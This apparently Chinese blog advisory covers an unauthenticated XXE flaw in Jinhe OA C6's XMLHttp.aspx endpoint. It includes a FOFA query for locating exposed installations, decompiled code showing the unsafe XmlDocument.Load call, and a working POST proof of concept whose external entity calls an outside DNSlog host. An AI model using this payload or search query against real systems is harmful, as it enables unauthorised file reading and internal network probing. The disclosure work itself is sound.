---
title: "金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-CrmSystemSet-XMLHttp-xxe.html
asset_dir: assets/金和oa-jhsoft.web.crmsystemsetxmlhttp.aspx-xxe漏洞
---

# 金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/27 13:31
- 209浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

SQL

XMLHttpRequest

软件

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.CrmSystemSet/XMLHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

脚本语言

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

Docker加速服务

文本剥离工具

网络安全培训

直接根据 `JHSoft.Web.CrmSystemSet/XMLHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.CrmSystemSet.dll` 将其进行反编译后找到 **QuickMatch** 的处理逻辑

```
public class XMLHttp : Page
{
  private string strPlanTypeIDlist = string.Empty;
  private DBOperator dbop = DBOperatorFactory.GetDBOperator();
  private string strSql = string.Empty;
  protected HtmlForm Form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.CrmSystemSet/XMLHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

XMLHttp

授权

网络安全课程

在DNSLOG平台成功收到请求

漏洞预警服务

[![金和OA JHSoft.Web.CrmSystemSet/XMLHttp.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
